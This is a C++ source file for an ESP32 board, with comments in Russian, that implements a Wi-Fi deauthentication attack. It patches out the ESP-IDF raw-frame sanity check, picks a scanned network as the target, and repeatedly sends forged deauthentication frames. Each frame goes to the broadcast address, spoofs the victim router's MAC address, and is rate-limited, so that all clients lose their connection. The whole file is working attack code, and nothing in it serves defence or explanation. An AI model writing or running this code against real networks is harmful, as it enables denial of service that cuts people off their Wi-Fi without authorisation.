#include "deauth.h"
#include "scan.h"
#include "config.h"
#include <esp_wifi.h> // <--- ВАЖНО: Добавлено это включение

bool isAttacking = false;
int targetIndex = -1;
unsigned long lastPacketTime = 0;

// Хак для обхода проверки целостности пакетов в ESP-IDF
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void startDeauth(int index) {
    if (index < 0 || index >= networkCount) {
        Serial.println("Invalid ID.");
        return;
    }
    
    targetIndex = index;
    isAttacking = true;
    
    Serial.print("Starting attack on: ");
    Serial.println(networks[index].ssid);
    
    // Переключаем WiFi в режим STA для отправки пакетов
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
}

void stopDeauth() {
    isAttacking = false;
    targetIndex = -1;
    esp_wifi_set_promiscuous(false);
    Serial.println("Attack stopped.");
}

void sendDeauthPackets() {
    if (!isAttacking || targetIndex == -1) return;
    
    // Контроль скорости отправки
    if (millis() - lastPacketTime < (1000 / PACKETS_PER_SECOND)) {
        return;
    }
    lastPacketTime = millis();
    
    WifiNetwork target = networks[targetIndex];
    
    // Создаем Deauth фрейм
    deauth_frame_t frame;
    memset(&frame, 0, sizeof(deauth_frame_t));
    
    frame.frame_control[0] = 0xC0; // Type: Management, Subtype: Deauthentication
    frame.frame_control[1] = 0x00;
    frame.duration[0] = 0x00;
    frame.duration[1] = 0x00;
    
    // Dest: Broadcast (FF:FF:FF:FF:FF:FF) чтобы разорвать связь со всеми клиентами
    memset(frame.dest, 0xFF, 6);
    
    // Src и BSSID: MAC адрес роутера жертвы
    memcpy(frame.src, target.bssid, 6);
    memcpy(frame.bssid, target.bssid, 6);
    
    frame.seq[0] = 0xF0;
    frame.seq[1] = 0xFF;
    frame.reason = DEAUTH_REASON;
    
    // Устанавливаем канал
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    
    // Отправляем пакет
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(deauth_frame_t), false);
    
    if (err != ESP_OK) {
        // Ошибка отправки (часто бывает на C3 без патча ядра)
        // Serial.printf("TX Error: %d\n", err);
    }
}
